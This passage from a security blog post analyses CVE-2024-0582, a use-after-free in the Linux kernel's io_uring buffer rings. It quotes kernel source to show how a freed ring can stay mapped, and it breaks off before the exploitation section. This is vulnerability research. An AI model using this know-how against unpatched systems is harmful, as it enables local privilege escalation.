<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="arttnba3">


    <meta name="subtitle" content="arttnba3的秘密小屋">


    <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ">



<title>[CVE.0x0C] Analysis and Exploitation of CVE-2024-0582 | arttnba3&#39;s blog</title>



    <link rel="icon" href="/img/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">「arttnba3」&#39;s reservation</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">「arttnba3」&#39;s reservation</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">[CVE.0x0C] Analysis and Exploitation of CVE-2024-0582</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">arttnba3</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">二月 22, 2025&nbsp;&nbsp;5:33:26</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CVE/">CVE</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="0x00-Before-We-Start"><a href="#0x00-Before-We-Start" class="headerlink" title="0x00. Before We Start"></a>0x00. Before We Start</h1><p><a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2024-0582">CVE-2024-0582</a> is a <strong>Use-After-Free</strong> vulnerability found in the Linux kernel’s <a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man7/io_uring.7.html">io_uring</a> subsystem, which is caused by the lack of check of the memory usage in the ring buffer. An unprivileged attacker can exploit this vulnerability by registering a ring buffer with memory allocated by <code>IORING_REGISTER_PBUF_RING</code> in a specific <code>io_uring</code>, doing the mmap then, and freeing the ring buffer. This security flaw allows an unprivileged local user to crash the system or to escalate their privileges.</p>
<p>The <a target="_blank" rel="noopener" href="https://www.first.org/cvss/">CVSS score</a> of this vulnerability is <code>7.8</code>, detailed as follow.</p>
<table>
<thead>
<tr>
<th align="center">Score</th>
<th align="center">Severity</th>
<th align="center">Version</th>
<th align="center">Vector String</th>
</tr>
</thead>
<tbody><tr>
<td align="center">7.8</td>
<td align="center">High</td>
<td align="center">3.1</td>
<td align="center">CVSS:3.1&#x2F;AV:L&#x2F;AC:L&#x2F;PR:L&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td>
</tr>
</tbody></table>
<h1 id="0x01-Analysis-of-the-vulnerability"><a href="#0x01-Analysis-of-the-vulnerability" class="headerlink" title="0x01. Analysis of the vulnerability"></a>0x01. Analysis of the vulnerability</h1><p>In this article, we will use the <code>6.5</code> version of the Linux kernel source code for our detailed analyzation.</p>
<p>As we all know that the <code>IO_URING</code> has provided us with three new system calls:</p>
<ul>
<li><code>io_uring_setup()</code>: This system call is used to create a new context of <code>io_uring</code>, which mainly consists of a <code>SQ</code> queue and a <code>CQ</code> queue with elements of a specific amount. A file descriptor will be returned to us for further operations.</li>
<li><code>io_uring_register()</code>: This system call is used to configure a specific <code>io_uring</code> instance. Available operations include registering new buffers, updating contents of buffers and unregistering buffers, etc.</li>
<li><code>io_uring_enter()</code>: This system call is used to submit a new I&#x2F;O request and user can choose to synchronously wait for the I&#x2F;O to be complete or not.</li>
</ul>
<p>For the <code>io_uring_register()</code> syscall, its prototype is as follow:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(io_uring_register, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, opcode,</span><br><span class="line">        <span class="type">void</span> __user *, arg, <span class="type">unsigned</span> <span class="type">int</span>, nr_args)</span><br></pre></td></tr></table></figure>

<p>In the core function of this system call which is <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_uring_register">__io_uring_register()</a>, there is a big <code>switch</code> statement for handling different <code>opcode</code> by calling corresponding functions. We mainly focus on the one related to the <code>IORING_REGISTER_PBUF_RING</code>.</p>
<h2 id="PBUF-RING-Internal"><a href="#PBUF-RING-Internal" class="headerlink" title="PBUF_RING Internal"></a>PBUF_RING Internal</h2><p>The <code>pbuf</code> (i.e., <code>packet buffer</code>) is a feature of the <code>io_uring</code>, which is somewhat a legacy concept originally coming from the network programming. </p>
<h3 id="I-Ring-Registration-IORING-REGISTER-PBUF-RING"><a href="#I-Ring-Registration-IORING-REGISTER-PBUF-RING" class="headerlink" title="I. Ring Registration: IORING_REGISTER_PBUF_RING"></a>I. Ring Registration: IORING_REGISTER_PBUF_RING</h3><p>The <code>io_uring</code> allow users to create a ring buffer with the opcode <code>IORING_REGISTER_PBUF_RING</code> through the <code>io_uring_register()</code>, which will finally calls to the function <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_register_pbuf_ring">io_register_pbuf_ring()</a> :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_register_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>, *<span class="title">free_bl</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="keyword">sizeof</span>(reg)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (reg.resv[<span class="number">0</span>] || reg.resv[<span class="number">1</span>] || reg.resv[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (reg.flags &amp; ~IOU_PBUF_RING_MMAP)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!reg.ring_addr)</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        <span class="keyword">if</span> (reg.ring_addr &amp; ~PAGE_MASK)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (reg.ring_addr)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_power_of_2(reg.ring_entries))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* cannot disambiguate full vs empty due to head/tail size */</span></span><br><span class="line">    <span class="keyword">if</span> (reg.ring_entries &gt;= <span class="number">65536</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(reg.bgid &lt; BGID_ARRAY &amp;&amp; !ctx-&gt;io_bl)) &#123;</span><br><span class="line">        <span class="type">int</span> ret = io_init_bl_list(ctx);</span><br><span class="line">        <span class="keyword">if</span> (ret)</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    bl = io_buffer_get_list(ctx, reg.bgid);</span><br><span class="line">    <span class="keyword">if</span> (bl) &#123;</span><br><span class="line">        <span class="comment">/* if mapped buffer ring OR classic exists, don&#x27;t allow */</span></span><br><span class="line">        <span class="keyword">if</span> (bl-&gt;is_mapped || !list_empty(&amp;bl-&gt;buf_list))</span><br><span class="line">            <span class="keyword">return</span> -EEXIST;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        free_bl = bl = kzalloc(<span class="keyword">sizeof</span>(*bl), GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!bl)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(reg.flags &amp; IOU_PBUF_RING_MMAP))</span><br><span class="line">        ret = io_pin_pbuf_ring(&amp;reg, bl);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ret = io_alloc_pbuf_ring(&amp;reg, bl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">        bl-&gt;nr_entries = reg.ring_entries;</span><br><span class="line">        bl-&gt;mask = reg.ring_entries - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        io_buffer_add_list(ctx, bl, reg.bgid);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kfree(free_bl);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Ignoring those checkers on parameters, we now take a look at its core logic:</p>
<ul>
<li>Firstly it will call <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> to obtain existing <code>io_buffer_list</code> structure, or allocate a new one if nothing exists.</li>
<li>If the bit <code>IOU_PBUF_RING_MMAP</code> is set in the flag of the request, it will call <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> to allocate continuous pages, otherwise the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_pin_pbuf_ring">io_pin_pbuf_ring()</a> will be called to pin pages from user space to the ring.</li>
<li>After all that have been completed, the result will be written into the <code>io_buffer_list</code> structure before, which will be saved into current context.</li>
</ul>
<p>As the vulnerability happens on the code path related to the <code>mmap()</code>, we now mainly focus on the path calling the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a> , which will finally call<code>__get_free_pages()</code> to allocate pages.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_alloc_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_uring_buf_reg *reg,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> io_buffer_list *bl)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;</span><br><span class="line">    <span class="type">size_t</span> ring_size;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ring_size = reg-&gt;ring_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_buf_ring);</span><br><span class="line">    ptr = (<span class="type">void</span> *) __get_free_pages(gfp, get_order(ring_size));</span><br><span class="line">    <span class="keyword">if</span> (!ptr)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    bl-&gt;buf_ring = ptr;</span><br><span class="line">    bl-&gt;is_mapped = <span class="number">1</span>;</span><br><span class="line">    bl-&gt;is_mmap = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The structure of the <code>io_buffer_list</code> is as following figure.</p>
<p><img src="https://s2.loli.net/2025/03/13/nzrlJ62up7TomCy.png"></p>
<h3 id="II-Unregistration-IORING-UNREGISTER-PBUF-RING"><a href="#II-Unregistration-IORING-UNREGISTER-PBUF-RING" class="headerlink" title="II. Unregistration:  IORING_UNREGISTER_PBUF_RING"></a>II. Unregistration:  IORING_UNREGISTER_PBUF_RING</h3><p>Corresponding to the registration, <code>io_uring</code> allows users to unregister a <code>PBUF_RING</code> with the opcode <code>IORING_UNREGISTER_PBUF_RING</code> , which will calls to <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_unregister_pbuf_ring">io_unregister_pbuf_ring()</a> to handle that.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_unregister_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">void</span> __user *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_buf_reg</span> <span class="title">reg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span> *<span class="title">bl</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;reg, arg, <span class="keyword">sizeof</span>(reg)))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (reg.resv[<span class="number">0</span>] || reg.resv[<span class="number">1</span>] || reg.resv[<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (reg.flags)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    bl = io_buffer_get_list(ctx, reg.bgid);</span><br><span class="line">    <span class="keyword">if</span> (!bl)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line">    <span class="keyword">if</span> (!bl-&gt;is_mapped)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    __io_remove_buffers(ctx, bl, <span class="number">-1U</span>);</span><br><span class="line">    <span class="keyword">if</span> (bl-&gt;bgid &gt;= BGID_ARRAY) &#123;</span><br><span class="line">        xa_erase(&amp;ctx-&gt;io_bl_xa, bl-&gt;bgid);</span><br><span class="line">        kfree(bl);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Its core logics are:</p>
<ul>
<li>Firstly it will call the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_buffer_get_list">io_buffer_get_list()</a> to obtain existing <code>io_buffer_list</code> structure, if nothing exists it will return.</li>
<li>Then it will call the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> to release pages stored in the <code>io_buffer_list</code> structure.</li>
<li>Finally it will call the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/xa_erase">xa_erase()</a> to remove this <code>io_buffer_list</code> from our context and release it as well.</li>
</ul>
<p>Before we take a look into the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a>, let’s firstly have a quick look at the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_alloc_pbuf_ring">io_alloc_pbuf_ring()</a>. We can notice that some members of the <code>io_buffer_list</code> are assigned with specific values.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_alloc_pbuf_ring</span><span class="params">(<span class="keyword">struct</span> io_uring_buf_reg *reg,</span></span><br><span class="line"><span class="params">                  <span class="keyword">struct</span> io_buffer_list *bl)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    bl-&gt;is_mapped = <span class="number">1</span>;</span><br><span class="line">    bl-&gt;is_mmap = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>Hence we will go into this path in the <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/__io_remove_buffers">__io_remove_buffers()</a> to release pages we allocated before.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_remove_buffers(<span class="keyword">struct</span> io_ring_ctx *ctx,</span><br><span class="line">                   <span class="keyword">struct</span> io_buffer_list *bl, <span class="type">unsigned</span> nbufs)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* shouldn&#x27;t happen */</span></span><br><span class="line">    <span class="keyword">if</span> (!nbufs)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (bl-&gt;is_mapped) &#123;</span><br><span class="line">        i = bl-&gt;buf_ring-&gt;tail - bl-&gt;head;</span><br><span class="line">        <span class="keyword">if</span> (bl-&gt;is_mmap) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">            page = virt_to_head_page(bl-&gt;buf_ring);</span><br><span class="line">            <span class="keyword">if</span> (put_page_testzero(page))</span><br><span class="line">                free_compound_page(page);</span><br><span class="line">            bl-&gt;buf_ring = <span class="literal">NULL</span>;</span><br><span class="line">            bl-&gt;is_mmap = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>In newer version of this function the <code>put_page_testzero()</code> will be replaced by <code>folio_put(virt_to_folio(bl-&gt;buf_ring));</code> , but the core logics of them are the same.</p>
</blockquote>
<h3 id="III-Usage-io-uring-mmap"><a href="#III-Usage-io-uring-mmap" class="headerlink" title="III. Usage: io_uring_mmap"></a>III. Usage: io_uring_mmap</h3><p>How can we access these pages in the <code>PBUF_RING</code>? An easy way is to do the <code>mmap()</code> on the <code>io_uring</code>, which will call to the function <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_mmap">io_uring_mmap()</a>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> sz = vma-&gt;vm_end - vma-&gt;vm_start;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pfn;</span><br><span class="line">    <span class="type">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr = io_uring_validate_mmap_request(file, vma-&gt;vm_pgoff, sz);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line">        <span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line"></span><br><span class="line">    pfn = virt_to_phys(ptr) &gt;&gt; PAGE_SHIFT;</span><br><span class="line">    <span class="keyword">return</span> remap_pfn_range(vma, vma-&gt;vm_start, pfn, sz, vma-&gt;vm_page_prot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">io_uring_fops</span> =</span> &#123;</span><br><span class="line">    .release    = io_uring_release,</span><br><span class="line">    .mmap       = io_uring_mmap,</span><br></pre></td></tr></table></figure>

<p>In the function <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.5/C/ident/io_uring_validate_mmap_request">io_uring_validate_mmap_request()</a> it will firstly determine the specific operation by the <code>offset</code> parameter of the <code>mmap()</code> syscall, which means that this value is not the legacy offset, but using higher bits as the type and lower bits as the value. We mainly focus on the path related to the <code>PBUF_RING</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">io_uring_validate_mmap_request</span><span class="params">(<span class="keyword">struct</span> file *file,</span></span><br><span class="line"><span class="params">                        <span class="type">loff_t</span> 